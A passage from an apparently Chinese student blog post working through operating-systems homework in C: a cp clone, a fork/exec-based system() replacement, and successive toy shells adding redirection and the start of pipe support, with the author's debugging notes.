class="meta-string">&lt;sys/fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">( <span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[] )</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>( argc == <span class="number">0</span>  )&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>( argc == <span class="number">1</span> )&#123;<span class="comment">//无文件参数</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"mycp: missing file operand\nTry 'cp --help' for more information.\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>( argc == <span class="number">2</span> )&#123;<span class="comment">//只有1个文件参数</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"mycp: missing destination file operand after '%s'\n"</span>, argv[<span class="number">1</span>]); </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Try 'cp --help' for more information.\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>( argc == <span class="number">3</span> )&#123;<span class="comment">//2个文件参数</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="built_in">strcmp</span>(argv[<span class="number">1</span>], argv[<span class="number">2</span>]) == <span class="number">0</span> )&#123;<span class="comment">//文件名相同</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"mycp: '%s' and '%s' are the same file\n"</span>, argv[<span class="number">1</span>], argv[<span class="number">2</span>]);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> s_fd = <span class="built_in">open</span>(argv[<span class="number">1</span>], O_RDONLY);<span class="comment">//源文件-只读</span></span><br><span class="line">        <span class="keyword">if</span>( s_fd==<span class="number">-1</span> )&#123;<span class="comment">//文件不存在</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"mycp: cannot stat '%s': No such file or directory\n"</span>, argv[<span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">int</span> t_fd = <span class="built_in">open</span>(argv[<span class="number">2</span>], O_RDWR | O_TRUNC | O_CREAT);<span class="comment">//目标文件-创建+截断+读写</span></span><br><span class="line">            <span class="keyword">char</span> *buf;</span><br><span class="line">            <span class="keyword">int</span> maxn = <span class="number">10000</span>;<span class="comment">//接受最大字符数</span></span><br><span class="line">            buf = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(maxn);</span><br><span class="line">            <span class="keyword">int</span> s_rd = <span class="built_in">read</span>(s_fd, buf, maxn);</span><br><span class="line">            <span class="keyword">if</span>( s_rd==<span class="number">-1</span> )&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Read failed!\n"</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">// printf("%s", buf);</span></span><br><span class="line">                <span class="keyword">int</span> t_we = <span class="built_in">write</span>(t_fd, buf, <span class="built_in">strlen</span>(buf));<span class="comment">//缓冲区大小</span></span><br><span class="line">                <span class="keyword">if</span>( t_we==<span class="number">-1</span> )&#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"Write failed!\n"</span>);</span><br><span class="line">                    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//关闭文件</span></span><br><span class="line">            <span class="built_in">close</span>(s_fd);</span><br><span class="line">            <span class="built_in">close</span>(t_fd);</span><br><span class="line">            <span class="comment">//新建的文件加权限</span></span><br><span class="line">            chmod(argv[<span class="number">2</span>], S_IRUSR|S_IWUSR|S_IXUSR|S_IRGRP|S_IWGRP|S_IXGRP|S_IROTH|S_IWOTH|S_IXOTH);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"TODO\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="task-3-多进程题目"><a class="markdownIt-Anchor" href="#task-3-多进程题目"></a> Task 3+ 多进程题目</h1><h2 id="31-mysys-task3"><a class="markdownIt-Anchor" href="#31-mysys-task3"></a> 3.1 mysys (Task3)</h2><ul><li>mysys的功能与系统函数system相同，要求用进程管理相关系统调用自己实现一遍</li><li><strong>使用fork/exec/wait系统调用实现mysys</strong></li><li>不能通过调用系统函数system实现mysys</li></ul><blockquote><p><strong>题外话</strong>：vscode直接运行代码的话会出现问题，<code>---------</code>会在最后输出，在命令行运行并没问题。目前原因还不知道</p><p><strong>5月15日</strong>：在实现Task5时发现功能已经具备，这才察觉到Task3写错了，原来使用<code>execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-c&quot;, command, NULL);</code>，其实这与调用系统函数system无异。第一个参数应该指定可命令的路径，而不是直接指定sh。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> max_argc = <span class="number">100</span>;<span class="comment">//命令参数最大数量</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mysys</span><span class="params">(<span class="keyword">char</span> *command)</span> </span>&#123;</span><br><span class="line">    <span class="comment">/* 实现该函数，该函数执行一条命令，并等待该命令执行结束 */</span></span><br><span class="line">    <span class="comment">// 命令为空</span></span><br><span class="line">    <span class="keyword">if</span> (command == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Command is a null string!"</span>);</span><br><span class="line">        <span class="keyword">return</span> ; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 命令不为空</span></span><br><span class="line">    <span class="keyword">char</span> copy_command[<span class="built_in">strlen</span>(command) + <span class="number">1</span>];<span class="comment">//command的副本，避免影响传进来的参数</span></span><br><span class="line">    <span class="built_in">strcpy</span>(copy_command, command);</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    pid = fork();<span class="comment">//创建子进程</span></span><br><span class="line">    <span class="keyword">char</span> *argv[max_argc];<span class="comment">//命令参数列表</span></span><br><span class="line">    <span class="keyword">char</span> *tmp_arg;<span class="comment">//切割字符串的临时变量</span></span><br><span class="line">    <span class="keyword">int</span> argc = <span class="number">0</span>;<span class="comment">//命令参数数量</span></span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// execl("/bin/sh", "sh", "-c", command, NULL);</span></span><br><span class="line">        <span class="comment">//分割字符串</span></span><br><span class="line">        tmp_arg = strtok(copy_command, <span class="string">" "</span>);</span><br><span class="line">        argv[argc++] = tmp_arg;</span><br><span class="line">        <span class="keyword">while</span> (tmp_arg &amp;&amp; argc &lt;= max_argc) &#123;</span><br><span class="line">            tmp_arg = strtok(<span class="literal">NULL</span>, <span class="string">" "</span>);</span><br><span class="line">            argv[argc++] = tmp_arg;</span><br><span class="line">        &#125;</span><br><span class="line">        argv[argc] = <span class="literal">NULL</span>;<span class="comment">//将最后一项设置为NULL指针</span></span><br><span class="line">        execvp(argv[<span class="number">0</span>], argv);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE); <span class="comment">// exec执行失败返回EXIT_FAILURE，执行成功这句就不执行</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;<span class="comment">//父进程</span></span><br><span class="line">        wait(<span class="literal">NULL</span>);<span class="comment">//等待子进程结束</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"--------------------------------------------------\n"</span>);</span><br><span class="line">    mysys(<span class="string">"echo HELLO WORLD"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"--------------------------------------------------\n"</span>);</span><br><span class="line">    mysys(<span class="string">"ls /"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"--------------------------------------------------\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="32-sh1c-task4"><a class="markdownIt-Anchor" href="#32-sh1c-task4"></a> 3.2 sh1.c (Task4)</h2><ul><li>该程序读取用户输入的命令，调用函数mysys(上一个作业)执行用户的命令</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> max_argc = <span class="number">100</span>;<span class="comment">//命令参数最大数量</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* mysys.c实现的作业 */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mysys</span><span class="params">(<span class="keyword">char</span> *command)</span> </span>&#123;</span><br><span class="line">    <span class="comment">/* 实现该函数，该函数执行一条命令，并等待该命令执行结束 */</span></span><br><span class="line">    <span class="comment">// 命令为空</span></span><br><span class="line">    <span class="keyword">if</span> (command == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Command is a null string!"</span>);</span><br><span class="line">        <span class="keyword">return</span> ; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 命令不为空</span></span><br><span class="line">    <span class="keyword">char</span> copy_command[<span class="built_in">strlen</span>(command) + <span class="number">1</span>];<span class="comment">//command的副本，避免影响传进来的参数</span></span><br><span class="line">    <span class="built_in">strcpy</span>(copy_command, command);</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    pid = fork();<span class="comment">//创建子进程</span></span><br><span class="line">    <span class="keyword">char</span> *argv[max_argc];<span class="comment">//命令参数列表</span></span><br><span class="line">    <span class="keyword">char</span> *tmp_arg;<span class="comment">//切割字符串的临时变量</span></span><br><span class="line">    <span class="keyword">int</span> argc = <span class="number">0</span>;<span class="comment">//命令参数数量</span></span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// execl("/bin/sh", "sh", "-c", command, NULL);</span></span><br><span class="line">        <span class="comment">//分割字符串</span></span><br><span class="line">        tmp_arg = strtok(copy_command, <span class="string">" "</span>);</span><br><span class="line">        argv[argc++] = tmp_arg;</span><br><span class="line">        <span class="keyword">while</span> (tmp_arg &amp;&amp; argc &lt;= max_argc) &#123;</span><br><span class="line">            tmp_arg = strtok(<span class="literal">NULL</span>, <span class="string">" "</span>);</span><br><span class="line">            argv[argc++] = tmp_arg;</span><br><span class="line">        &#125;</span><br><span class="line">        argv[argc] = <span class="literal">NULL</span>;<span class="comment">//将最后一项设置为NULL指针</span></span><br><span class="line">        execvp(argv[<span class="number">0</span>], argv);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE); <span class="comment">// exec执行失败返回EXIT_FAILURE，执行成功这句就不执行</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;<span class="comment">//父进程</span></span><br><span class="line">        wait(<span class="literal">NULL</span>);<span class="comment">//等待子进程结束</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;<span class="comment">//循环输入</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"&gt; "</span>);</span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">1000</span>;<span class="comment">//最长命令字符数</span></span><br><span class="line">        <span class="keyword">char</span> cmd[maxn];<span class="comment">//命令</span></span><br><span class="line">        <span class="comment">// gets(cmd);</span></span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%[^\n]%*c"</span>, cmd);<span class="comment">//替代gets</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strcmp</span>(cmd, <span class="string">"exit"</span>) == <span class="number">0</span>) &#123;<span class="comment">//终止sh</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        mysys(cmd);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="33-sh2c-task5"><a class="markdownIt-Anchor" href="#33-sh2c-task5"></a> 3.3 sh2.c (Task5)</h2><ul><li>实现shell程序，要求在第1版的基础上，添加如下功能：<strong>实现文件重定向</strong></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;//open</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> max_argc = <span class="number">100</span>;<span class="comment">//命令参数最大数量</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mysys</span><span class="params">(<span class="keyword">char</span> *command)</span> </span>&#123;</span><br><span class="line">    <span class="comment">/* 实现该函数，该函数执行一条命令，并等待该命令执行结束 */</span></span><br><span class="line">    <span class="comment">// 命令为空</span></span><br><span class="line">    <span class="keyword">if</span> (command == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Command is a null string!"</span>);</span><br><span class="line">        <span class="keyword">return</span> ; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 命令不为空，将命令分为两部分</span></span><br><span class="line">    <span class="keyword">char</span> *cmd1, *cmd2;</span><br><span class="line">    cmd1 = strtok(command, <span class="string">"&gt;"</span>);</span><br><span class="line">    cmd2 = strtok(<span class="literal">NULL</span>, <span class="string">"&gt;"</span>);</span><br><span class="line">    <span class="keyword">char</span> copy_command[<span class="built_in">strlen</span>(cmd1) + <span class="number">1</span>];<span class="comment">//command的副本，避免影响传进来的参数</span></span><br><span class="line">    <span class="built_in">strcpy</span>(copy_command, cmd1);</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    pid = fork();<span class="comment">//创建子进程</span></span><br><span class="line">    <span class="keyword">char</span> *argv[max_argc];<span class="comment">//命令参数列表</span></span><br><span class="line">    <span class="keyword">char</span> *tmp_arg;<span class="comment">//切割字符串的临时变量</span></span><br><span class="line">    <span class="keyword">int</span> argc = <span class="number">0</span>;<span class="comment">//命令参数数量</span></span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// execl("/bin/sh", "sh", "-c", command, NULL);</span></span><br><span class="line">        <span class="comment">// 分割cmd1字符串</span></span><br><span class="line">        tmp_arg = strtok(copy_command, <span class="string">" "</span>);</span><br><span class="line">        argv[argc++] = tmp_arg;</span><br><span class="line">        <span class="keyword">while</span> (tmp_arg &amp;&amp; argc &lt;= max_argc) &#123;</span><br><span class="line">            tmp_arg = strtok(<span class="literal">NULL</span>, <span class="string">" "</span>);</span><br><span class="line">            argv[argc++] = tmp_arg;</span><br><span class="line">        &#125;</span><br><span class="line">        argv[argc] = <span class="literal">NULL</span>;<span class="comment">//将最后一项设置为NULL指针</span></span><br><span class="line">        <span class="comment">// 重定向至cmd2所指的文件</span></span><br><span class="line">        <span class="keyword">if</span> (cmd2) &#123;</span><br><span class="line">            <span class="keyword">int</span> fd;</span><br><span class="line">            fd = <span class="built_in">open</span>(cmd2, O_CREAT|O_RDWR, <span class="number">0666</span>); </span><br><span class="line">            dup2(fd, <span class="number">1</span>); </span><br><span class="line">            <span class="built_in">close</span>(fd);</span><br><span class="line">        &#125;</span><br><span class="line">        execvp(argv[<span class="number">0</span>], argv);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE); <span class="comment">// exec执行失败返回EXIT_FAILURE，执行成功这句就不执行</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;<span class="comment">//父进程</span></span><br><span class="line">        wait(<span class="literal">NULL</span>);<span class="comment">//等待子进程结束</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;<span class="comment">//循环输入</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"&gt; "</span>);</span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">1000</span>;<span class="comment">//最长命令字符数</span></span><br><span class="line">        <span class="keyword">char</span> cmd[maxn];<span class="comment">//命令</span></span><br><span class="line">        <span class="comment">// gets(cmd);</span></span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%[^\n]%*c"</span>, cmd);<span class="comment">//替代gets</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strcmp</span>(cmd, <span class="string">"exit"</span>) == <span class="number">0</span>) &#123;<span class="comment">//终止sh</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        mysys(cmd);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="34-sh3c-task6"><a class="markdownIt-Anchor" href="#34-sh3c-task6"></a> 3.4 sh3.c (Task6)</h2><p>实现shell程序，要求在第2版的基础上，添加如下功能：</p><ul><li>实现管道</li><li>只要求连接两个命令，不要求连接多个命令</li><li>不要求同时处理管道和重定向</li><li>考虑如何实现管道和文件重定向，暂不做强制要求</li></ul><blockquote><p>此次作业遇到诸多问题，消费时间过长，主要是要静下来、沉下来，问题如下：</p><ol><li>strtok返回参数问题：返回值无法打印复制等，报<code>segmentation fault</code>错误，需要加个头文件<code>#include &lt;string.h&gt;</code></li><li>pipe要在fork之前</li><li>初步实现的代码执行完<code>cat /etc/passwd | wc -l</code>后就立马退出程序，不知道是什么原因</li></ol><p>为实现进阶功能，后续打算参考<code>MIT6.828 homework2：shell</code>进行实现。参考：</p><ul><li><a href="https://www.linuxmooc.com/T/sh3-hint.pdf" target="_blank" rel="noopener">https://www.linuxmooc.com/T/sh3-hint.pdf</a></li><li><a href="https://www.linuxmooc.com/courses/fd/" target="_blank" rel="noopener">https://www.linuxmooc.com/courses/fd/</a></li><li><a href="https://blog.csdn.net/a747979985/article/details/95094094" target="_blank" rel="noopener">https://blog.csdn.net/a747979985/article/details/95094094</a></li></ul></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;//open</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> max_argc = <span class="number">100</span>;<span class="comment">//命令参数最大数量</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">1000</span>;<span class="comment">//最长命令字符数</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mysys</span><span class="params">(<span class="keyword">char</span> *command)</span> </span>&#123;</span><br><span class="line">    <span class="comment">/* 实现该函数，该函数执行一条命令，并等待该命令执行结束 */</span></span><br><span class="line">    <span class="comment">// 命令为空</span></span><br><span class="line">    <span class="keyword">if</span> (command == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Command is a null string!"</span>);</span><br><span class="line">        <span class="keyword">return</span> ; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 命令不为空，将命令分为两部分</span></span><br><span class="line">    <span class="keyword">char</span> *cmd1 = <span class="literal">NULL</span>, *cmd2 = <span class="literal">NULL</span>;</span><br><span class="line">    cmd1 = strtok(command, <span class="string">"|"</span>);</span><br><span class="line">    cmd2 = strtok(<span class="literal">NULL</span>, <span class="string">"|"</span>);</span><br><span class="line">    <span class="keyword">char</span> copy_cmd1[maxn];<span class="comment">//创建副本，避免影响传进来的参数</span></span><br><span class="line">    <span class="keyword">char</span> copy_cmd2[maxn];<span class="comment">//创建副本，避免影响传进来的参数</span></span><br><span class="line">    <span class="built_in">strcpy</span>(copy_cmd1, cmd1);</span><br><span class="line">    